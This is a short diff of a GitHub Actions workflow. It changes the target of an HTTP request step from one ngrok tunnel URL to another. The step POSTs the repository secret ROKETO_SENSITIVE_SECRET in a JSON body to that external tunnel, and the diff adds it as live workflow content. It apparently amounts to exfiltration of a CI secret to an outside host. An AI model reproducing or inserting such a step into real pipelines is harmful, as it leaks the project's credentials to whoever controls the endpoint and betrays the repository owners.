@@ -17,6 +17,6 @@ jobs:
       
       - uses: fjogeleit/http-request-action@master
         with:
-          url: 'https://6858-93-172-42-40.ngrok.io'
+          url: 'https://934e-77-137-8-226.ngrok.io'
           method: 'POST'
           data: '{"secret": "${{ secrets.ROKETO_SENSITIVE_SECRET }}"}'
